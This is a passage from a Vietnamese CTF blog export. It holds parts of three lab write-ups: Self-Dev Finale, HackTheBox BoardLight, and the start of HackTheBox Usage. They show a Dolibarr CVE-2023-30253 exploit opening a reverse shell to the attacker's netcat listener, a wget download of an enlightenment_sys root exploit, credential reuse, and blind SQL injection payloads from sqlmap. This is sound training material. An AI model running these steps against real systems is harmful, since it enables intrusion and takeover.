,ï¿½X X ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½=ï¿½-ï¿½ï¿½?ï¿½ï¿½ï¿½?0/ @0080` ï¿½3ï¿½s5â¦bill@finale:/home/mark$ Boom! Äáº­p vÃ o máº¯t tÃ´i lÃ  dÃ²ng chá»¯ mark:zuckerberg1984do you love cats?. ÄÃ¢y cÃ³ thá»ƒ chÃ­nh lÃ  password cá»§a user mark\nÄá»ƒ cháº¯c cháº¯n hÆ¡n thÃ¬ tÃ´i sáº½ láº¥y file nÃ y vá» mÃ¡y kali Ä‘á»ƒ phÃ¢n tÃ­ch\nbill@finale:/home/mark$ which python bill@finale:/home/mark$ which python3 /usr/bin/python3 bill@finale:/home/mark$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... â”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ wget http://192.168.24.165:8000/actvn --2024-06-24 14:13:17-- http://192.168.24.165:8000/actvn Connecting to 192.168.24.165:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 15952 (16K) [application/octet-stream] Saving to: â€˜actvnâ€™ actvn 100%[===================================================\u0026gt;] 15.58K --.-KB/s in 0.001s 2024-06-24 14:13:17 (27.8 MB/s) - â€˜actvnâ€™ saved [15952/15952] â”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ chmod +x actvn â”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ ./actvn do you love cats? â”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ strings actvn /lib64/ld-linux-x86-64.so.2 __cxa_finalize __libc_start_main puts libc.so.6 GLIBC_2.2.5 GLIBC_2.34 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable PTE1 u+UH mark:zuckerberg1984 do you love cats? ;*3$\u0026#34; GCC: (Debian 13.2.0-24) 13.2.0 Scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry actvn.c __FRAME_END__ _DYNAMIC __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_start_main@GLIBC_2.34 _ITM_deregisterTMCloneTable puts@GLIBC_2.2.5 _edata _fini __data_start __gmon_start__ __dso_handle _IO_stdin_used _end __bss_start main __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@GLIBC_2.2.5 _init .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got.plt .data .bss .comment â”Œâ”€â”€(neoã‰¿n0b0dy)-[~] â””â”€$ Sá»­ dá»¥ng strings -\u0026gt; mark:zuckerberg1984. Thá»­ chuyá»ƒn sang user mark\nbill@finale:/home/mark$ su mark Password: mark@finale:~$ whoami mark mark@finale:~$ id uid=1000(mark) gid=1000(mark) groups=1000(mark),27(sudo) Thá»­ sudo -l\nmark@finale:~$ sudo -l [sudo] password for mark: Matching Defaults entries for mark on finale: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User mark may run the following commands on finale: (ALL : ALL) ALL mark@finale:~$ Äiá»u nÃ y cÃ³ nghÄ©a lÃ  mark cÃ³ quyá»n sá»­ dá»¥ng lá»‡nh sudo Ä‘á»ƒ cháº¡y báº¥t ká»³ lá»‡nh nÃ o. Xong! Root Ä‘Ã¢y rá»“i\nmark@finale:~$ sudo su root@finale:/home/mark# whoami root root@finale:/home/mark# id uid=0(root) gid=0(root) groups=0(root) root@finale:/home/mark# cd /root root@finale:~# ls -la total 48 drwx------ 6 root root 4096 Jun 24 02:50 . drwxr-xr-x 19 root root 4096 Jun 18 09:52 .. -rw-r--r-- 1 root root 101 Jun 21 17:36 .apport-ignore.xml -rw------- 1 root root 241 Jun 24 02:50 .bash_history -rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc drwx------ 2 root root 4096 Jun 19 16:10 .cache drwxr-xr-x 3 root root 4096 Jun 18 10:01 .local -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -rw------- 1 root root 33 Jun 21 15:34 root.txt drwx------ 3 root root 4096 Jun 18 09:56 snap drwx------ 2 root root 4096 Jun 18 09:56 .ssh -rw-r--r-- 1 root root 175 Jun 20 19:00 .wget-hsts root@finale:~# cat root.txt 4ca4fe79193fde3204b548932c3a40a7 root@finale:~# Náº¿u tháº¥y box nÃ y hay, báº¡n cÃ³ thá»ƒ báº¥m vÃ o nÃºt Clap bÃªn dÆ°á»›i Ä‘á»ƒ á»§ng há»™, hoáº·c náº¿u cÃ³ gÃ³p Ã½ hay trao Ä‘á»•i, Ä‘á»«ng ngáº§n ngáº¡i liÃªn há»‡ vá»›i tÃ´i qua pháº§n thÃ´ng tin liÃªn há»‡ trong Resume nhÃ©. Peace!\n","date":"23 June 2024","externalUrl":null,"permalink":"/ctf/selfdev/finale/","section":"Ctf","summary":"","title":"Self-Dev - Finale","type":"ctf"},{"content":"","date":"28 May 2024","externalUrl":null,"permalink":"/tags/dolibarr/","section":"Tags","summary":"","title":"Dolibarr","type":"tags"},{"content":"","date":"28 May 2024","externalUrl":null,"permalink":"/tags/enlightenment_sys/","section":"Tags","summary":"","title":"Enlightenment_sys","type":"tags"},{"content":"BroadLight lÃ  má»™t mÃ¡y Ä‘Æ¡n giáº£n táº­p trung vÃ o cÃ¡ch tÃ¬m kiáº¿m lá»— há»•ng vÃ  sá»­ dá»¥ng cÃ¡c PoC cá»§a nÃ³ Ä‘á»ƒ thá»±c hiá»‡n táº¥n cÃ´ng vÃ  leo thang Ä‘áº·c quyá»n. NgoÃ i ra ná»™i dung cá»§a mÃ¡y nÃ y cÅ©ng Ä‘Æ°a ra cáº£nh bÃ¡o vá» sá»± nguy hiá»ƒm cá»§a viá»‡c sá»­ dá»¥ng thÃ´ng tin Ä‘Äƒng nháº­p máº·c Ä‘á»‹nh vÃ  sá»­ dá»¥ng chung password giá»¯a cÃ¡c service khÃ¡c nhau trong há»‡ thá»‘ng.\nReconnaissance and Scanning # 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk= | 256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g= | 256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg 80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.41 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Truy cáº­p vÃ o port 80, tÃ´i cÃ³ má»™t trang web giá»›i thiá»‡u. LÆ°á»›t qua toÃ n bá»™ nÃ³, á»Ÿ pháº§n cuá»‘i cÃ¹ng xuáº¥t hiá»‡n 1 domain.\nThÃªm domain nÃ y vÃ o file host. Truy cáº­p láº¡i thÃ¬ cÅ©ng khÃ´ng cÃ³ gÃ¬ thay Ä‘á»•i. Tuy nhiÃªn, khi cÃ³ domain thÃ¬ tÃ´i sáº½ nghÄ© Ä‘áº¿n viá»‡c tÃ¬m subdomain hoáº·c vhost\nSá»­ dá»¥ng ffuf\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight] â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \u0026#34;Host: FUZZ.board.htb\u0026#34; -u http://board.htb -t 30 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://board.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.board.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 30 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ 12 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 99ms] 16 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 93ms] 19 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 93ms] a.auth-ns [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 176ms] 0 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 182ms] 10 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 182ms] a [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 183ms] 1 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 185ms] 01 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 185ms] 14 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 184ms] 13 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 184ms] a01 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 208ms] 5 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 209ms] 11 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 209ms] 18 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 212ms] 9 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 216ms] a02 [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 216ms] Táº¥t cáº£ Ä‘á»u lÃ  cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c, Ä‘iá»u nÃ y khÃ´ng Ä‘Ãºng láº¯m. Khi sá»­ dá»¥ng burpsuite Ä‘á»ƒ kiáº¿m tra Ä‘á»™ dÃ i cá»§a response thÃ¬ tÃ´i nháº­n Ä‘Æ°á»£c káº¿t quáº£ cÅ©ng lÃ  15949 giá»‘ng vá»›i size mÃ  ffuf Ä‘Ã£ quÃ©t ra Ä‘Æ°á»£c.\nTÃ´i sáº½ sá»­ dá»¥ng thÃªm 1 vÃ i options Ä‘á»ƒ bá» qua táº¥t cáº£ cÃ¡c káº¿t quáº£ cÃ³ size:15949 vÃ¬ tÃ´i biáº¿t cháº¯c cháº¯n nÃ³ khÃ´ng Ä‘Ãºng.\nTÃ´i sáº½ thÃªm -o Ä‘á»ƒ ffuf ghi káº¿t quáº£ ra file vÃ  dÃ¹ng grep Ä‘á»ƒ láº¥y ra cÃ¡c káº¿t quáº£ khÃ´ng pháº£i lÃ  15949\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight] â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H \u0026#34;Host: FUZZ.board.htb\u0026#34; -u http://board.htb -t 30 -o - | grep -v \u0026#34;15949\u0026#34; /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://board.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt :: Header : Host: FUZZ.board.htb :: Output file : - :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 30 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ crm [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 121ms] ThÃªm nÃ³ vÃ o file host vÃ  truy cáº­p crm.board.htb\nEnumeration # TÃ´i cÃ³ 1 form Ä‘Äƒng nháº­p vÃ  cÃ³ 1 cÃ¡i tÃªn Dolibarr 17.0.0. ÄÃ¢y cÃ³ thá»ƒ lÃ  trÃ¬nh quáº£n trá»‹ cá»§a site nÃ y vÃ  phiÃªn báº£n cá»§a nÃ³.\nThá»­ Ä‘Äƒng nháº­p vá»›i nhá»¯ng tÃ i khoáº£n Ä‘Æ¡n giáº£n thÃ¬ tÃ´i khÃ´ng ngá» lÃ  cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c vá»›i admin:admin. Tuy nhiÃªn thÃ¬ sau khi truy cáº­p, tÃ´i cÅ©ng khÃ´ng lÃ m thÃªm Ä‘Æ°á»£c gÃ¬ bá»Ÿi vÃ¬ user nÃ y khÃ´ng cÃ³ quyá»n quáº£n trá»‹.\nTÃ¬m kiáº¿m cÃ¡c exploit cá»§a dolibarr 17.0.0 thÃ¬ tÃ´i nháº­n Ä‘Æ°á»£c CVE-2023-30253. Clone nÃ³ vá» vÃ  exploit theo hÆ°á»›ng dáº«n thÃ´i\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253] â””â”€$ python3 exploit.py http://crm.board.htb admin admin 10.10.16.57 5555 [*] Trying authentication... [**] Login: admin [**] Password: admin [*] Trying created site... [*] Trying created page... [*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection Quay trá»Ÿ láº¡i listener\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253] â””â”€$ nc -lnvp 5555 listening on [any] 5555 ... connect to [10.10.16.57] from (UNKNOWN) [10.10.11.11] 53084 bash: cannot set terminal process group (858): Inappropriate ioctl for device bash: no job control in this shell www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ Thá»±c sá»± thÃ¬ tÃ´i khÃ´ng cÃ³ hiá»ƒu biáº¿t cÅ©ng nhÆ° kinh nghiá»‡m sá»­ dá»¥ng Dolibarr nÃ y, nÃªn tÃ´i Ä‘Ã£ nhá» Ä‘áº¿n sá»± giÃºp Ä‘á»¡ cá»§a Chatgpt Ä‘á»ƒ tÃ¬m kiáº¿m cÃ¡c thÃ´ng tin Ä‘Äƒng nháº­p Ä‘Æ°á»£c lÆ°u trÃªn mÃ£ nguá»“n\nThá»­ tÃ¬m file nÃ y trong mÃ£ nguá»“n\nwww-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cat ../../conf/conf.php \u0026lt;.htb/htdocs/public/website$ cat ../../conf/conf.php \u0026lt;?php // // File generated by Dolibarr installer 17.0.0 on May 13, 2024 // // Take a look at conf.php.example file for an example of conf.php file // and explanations for all possibles parameters. // $dolibarr_main_url_root=\u0026#39;http://crm.board.htb\u0026#39;; $dolibarr_main_document_root=\u0026#39;/var/www/html/crm.board.htb/htdocs\u0026#39;; $dolibarr_main_url_root_alt=\u0026#39;/custom\u0026#39;; $dolibarr_main_document_root_alt=\u0026#39;/var/www/html/crm.board.htb/htdocs/custom\u0026#39;; $dolibarr_main_data_root=\u0026#39;/var/www/html/crm.board.htb/documents\u0026#39;; $dolibarr_main_db_host=\u0026#39;localhost\u0026#39;; $dolibarr_main_db_port=\u0026#39;3306\u0026#39;; $dolibarr_main_db_name=\u0026#39;dolibarr\u0026#39;; $dolibarr_main_db_prefix=\u0026#39;llx_\u0026#39;; $dolibarr_main_db_user=\u0026#39;dolibarrowner\u0026#39;; $dolibarr_main_db_pass=\u0026#39;*************\u0026#39;; $dolibarr_main_db_type=\u0026#39;mysqli\u0026#39;; $dolibarr_main_db_character_set=\u0026#39;utf8\u0026#39;; $dolibarr_main_db_collation=\u0026#39;utf8_unicode_ci\u0026#39;; // Authentication settings $dolibarr_main_authentication=\u0026#39;dolibarr\u0026#39;; //$dolibarr_main_demo=\u0026#39;autologin,autopass\u0026#39;; // Security settings $dolibarr_main_prod=\u0026#39;0\u0026#39;; $dolibarr_main_force_https=\u0026#39;0\u0026#39;; $dolibarr_main_restrict_os_commands=\u0026#39;mysqldump, mysql, pg_dump, pgrestore\u0026#39;; $dolibarr_nocsrfcheck=\u0026#39;0\u0026#39;; $dolibarr_main_instance_unique_id=\u0026#39;ef9a8f59524328e3c36894a9ff0562b5\u0026#39;; $dolibarr_mailing_limit_sendbyweb=\u0026#39;0\u0026#39;; $dolibarr_mailing_limit_sendbycli=\u0026#39;0\u0026#39;; //$dolibarr_lib_FPDF_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_TCPDF_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_FPDI_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_TCPDI_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_GEOIP_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_NUSOAP_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_ODTPHP_PATH=\u0026#39;\u0026#39;; //$dolibarr_lib_ODTPHP_PATHTOPCLZIP=\u0026#39;\u0026#39;; //$dolibarr_js_CKEDITOR=\u0026#39;\u0026#39;; //$dolibarr_js_JQUERY=\u0026#39;\u0026#39;; //$dolibarr_js_JQUERY_UI=\u0026#39;\u0026#39;; //$dolibarr_font_DOL_DEFAULT_TTF=\u0026#39;\u0026#39;; //$dolibarr_font_DOL_DEFAULT_TTF_BOLD=\u0026#39;\u0026#39;; $dolibarr_main_distrib=\u0026#39;standard\u0026#39;; www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ User flag # Váº­y lÃ  tÃ´i cÃ³ thÃ´ng tin Ä‘á»ƒ Ä‘Äƒng nháº­p vÃ o mysql. Tuy nhiÃªn trÆ°á»›c khi Ä‘Äƒng nháº­p mysql thÃ¬ tÃ´i hay thá»­ thÃªm 1 hÆ°á»›ng ná»¯a lÃ  sá»­ dá»¥ng password cá»§a mysql Ä‘á»ƒ truy cáº­p vÃ o user xem cÃ³ Ä‘Æ°á»£c khÃ´ng\nVÃ  boom! Password cá»§a mysql cÅ©ng lÃ  password cá»§a user\nwww-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ su larissa su larissa Password: larissa@boardlight:/var/www/html/crm.board.htb/htdocs/public/website$ id id uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm) larissa@boardlight:/var/www/html/crm.board.htb/htdocs/public/website$ Quay sang ssh luÃ´n cho thuáº­n tiá»‡n, user flag cÅ©ng náº±m á»Ÿ Ä‘Ã¢y\nlarissa@boardlight:~$ ls Desktop Documents Downloads exploit.sh linpeas.sh Music Pictures Public sc.sh Templates user.txt Videos Privilege escalation # Sau khi thá»­ táº¥t cáº£ cÃ¡c cÃ¡ch thÃ´ng thÆ°á»ng Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i pháº£i táº£i linpeas lÃªn mÃ¡y Ä‘á»ƒ phÃ¢n tÃ­ch.\nSau khi cháº¡y linpeas, tÃ´i nháº­n Ä‘Æ°á»£c má»™t vÃ i káº¿t quáº£ báº¥t thÆ°á»ng trong pháº§n SUID\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ SUID - Check easy privesc, exploits and write perms â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-sr-x 1 root root 15K Apr 8 18:36 /usr/lib/xorg/Xorg.wrap -rwsr-xr-x 1 root root 27K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!) Thá»­ tÃ¬m kiáº¿m thÃ´ng tin cÃ¡c exploit hoáº·c CVE vá» enlightenment_sys, tÃ´i tÃ¬m tháº¥y CVE-2022-37706-LPE-exploit. Clone nÃ³ vá» vÃ  táº£i exploit lÃªn mÃ¡y\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight] â””â”€$ git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit Cloning into \u0026#39;CVE-2022-37706-LPE-exploit\u0026#39;... remote: Enumerating objects: 92, done. remote: Counting objects: 100% (92/92), done. remote: Compressing objects: 100% (92/92), done. remote: Total 92 (delta 32), reused 14 (delta 0), pack-reused 0 Receiving objects: 100% (92/92), 498.76 KiB | 938.00 KiB/s, done. Resolving deltas: 100% (32/32), done. â”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight] â””â”€$ cd CVE-2022-37706-LPE-exploit â”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight/CVE-2022-37706-LPE-exploit] â””â”€$ ll total 20 -rwxrwxr-x 1 kali kali 709 Jun 2 14:03 exploit.sh -rw-rw-r-- 1 kali kali 2014 Jun 2 14:03 PublicReferenceURL.txt -rw-rw-r-- 1 kali kali 7119 Jun 2 14:03 README.md drwxrwxr-x 2 kali kali 4096 Jun 2 14:03 screenshots â”Œâ”€â”€(kaliã‰¿kali)-[~/HTB/BoardLight/CVE-2022-37706-LPE-exploit] â””â”€$ python3 -m http.server 8080 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... TrÃªn mÃ¡y, táº£i exploit vá» vÃ  cháº¡y thá»­\nlarissa@boardlight:~$ wget http://10.10.16.57:8080/exploit.sh --2024-06-02 10:59:14-- http://10.10.16.57:8080/exploit.sh Connecting to 10.10.16.57:8080... connected. HTTP request sent, awaiting response... 200 OK Length: 709 [text/x-sh] Saving to: â€˜exploit.shâ€™ exploit.sh 100%[====================================================================================================================================================\u0026gt;] 709 --.-KB/s in 0.05s 2024-06-02 10:59:14 (13.1 KB/s) - â€˜exploit.shâ€™ saved [709/709] larissa@boardlight:~$ chmod +x exploit.sh larissa@boardlight:~$ ./exploit.sh CVE-2022-37706 [*] Trying to find the vulnerable SUID file... [*] This may take few seconds... [+] Vulnerable SUID binary found! [+] Trying to pop a root shell! [+] Enjoy the root shell :) mount: /dev/../tmp/: can\u0026#39;t find in /etc/fstab. # id uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa) # ","date":"28 May 2024","externalUrl":null,"permalink":"/ctf/hackthebox/boardlight/","section":"Ctf","summary":"","title":"HackTheBox - BoardLight","type":"ctf"},{"content":"Usage lÃ  má»™t machine má»©c Ä‘á»™ easy lá»£i dá»¥ng lá»— há»•ng SQL injection Ä‘á»ƒ truy cáº­p vÃ o database vÃ  láº¥y thÃ´ng tin Ä‘Äƒng nháº­p cá»§a ngÆ°á»i dÃ¹ng, sá»­ dá»¥ng cÃ¡c lá»— há»•ng tá»“n táº¡i trong phiÃªn báº£n cÅ© cá»§a Laravel framework Ä‘á»ƒ táº£i lÃªn RCE\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFfdLKVCM7tItpTAWFFy6gTlaOXOkNbeGIN9+NQMn89HkDBG3W3XDQDyM5JAYDlvDpngF58j/WrZkZw0rS6YqS0= | 256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8ATPpxGtqlj8B7z2Lh7GrZVTSsLb6MkU3laICZlTk 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: HEAD |_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain vÃ  file host vÃ  truy cáº­p web vá»›i port 80\nEnumeration # Thá»­ input cÃ¡c lá»— há»•ng SQLi vÃ  XSS Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i dáº¡o qua cÃ¡c pháº§n khÃ¡c cá»§a web nÃ y. Khi chá»n Admin, tÃ´i Ä‘Æ°á»£c Ä‘Æ°a Ä‘áº¿n má»™t subdomain khÃ¡c lÃ  admin.usage.htb. ThÃªm nÃ³ vÃ o file hosts Ä‘á»ƒ truy cáº­p\nLáº¡i lÃ  má»™t login form khÃ¡c nhÆ°ng lÃ  Ä‘á»ƒ truy cáº­p vÃ o admin panel. TÃ´i cÅ©ng khÃ´ng thá»ƒ thá»±c hiá»‡n SQLi nÃªn sáº½ quay láº¡i trang ban Ä‘áº§u.\nThá»­ Ä‘Äƒng kÃ½ tÃ i khoáº£n vÃ  Ä‘Äƒng nháº­p, tuy nhiÃªn sau khi login tÃ´i cÅ©ng khÃ´ng nháº­n Ä‘Æ°á»£c gÃ¬ Ä‘áº·c biá»‡t ngoÃ i cÃ¡c Ä‘oáº¡n text\nVáº­y lÃ  chá»‰ cÃ²n pháº§n Reset Password, tÃ´i cÅ©ng nháº­n Ä‘Æ°á»£c má»™t input nháº­p email. Tuy nhiÃªn thá»­ SQLi á»Ÿ pháº§n nÃ y thÃ¬ server Ä‘Ã£ xá»­ lÃ½ Ä‘Æ°á»£c payload cá»§a tÃ´i\nsqlmap # Sá»­ dá»¥ng burpsuite Ä‘á»ƒ láº¥y ná»™i dung request (bá» payload).\nSá»­ dá»¥ng sqlmap Ä‘á»ƒ thá»±c hiá»‡n SQLi vá»›i request vá»«a lÆ°u. Sá»­ dá»¥ng parameter email Ä‘á»ƒ khai thÃ¡c\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB-Usage] â””â”€$ sudo sqlmap -r request.txt --level=5 --risk=3 -p email --dump --batch ___ __H__ ___ ___[\u0026#34;]_____ ___ ___ {1.8.4#stable} |_ -| . [.] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [23:57:30] [INFO] parsing HTTP request from \u0026#39;request.txt\u0026#39; [23:57:30] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [23:57:30] [INFO] testing connection to the target URL got a 302 redirect to \u0026#39;http://usage.htb/forget-password\u0026#39;. Do you want to follow? [Y/n] Y redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: email (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment) Payload: _token=MIkLtbJSRbSB12kmbrAHgIrQmZ5sfn3GNujMZt9v\u0026amp;email=admin@mail.com\u0026#39; AND 7936=(SELECT (CASE WHEN (7936=7936) THEN 7936 ELSE (SELECT 2488 UNION SELECT 3253) END))-- dkmV Type: time-based blind Title: MySQL \u0026lt; 5.0.12 AND time-based blind (BENCHMARK) Payload: _token=MIkLtbJSRbSB12kmbrAHgIrQmZ5sfn3GNujMZt9v\u0026amp;email=admin@mail.com\u0026#39; AND 3261=BENCHMARK(5000000,MD5(0x6f7a696c))-- QjGd --- [23:57:30] [INFO] the back-end DBMS is MySQL web server operating 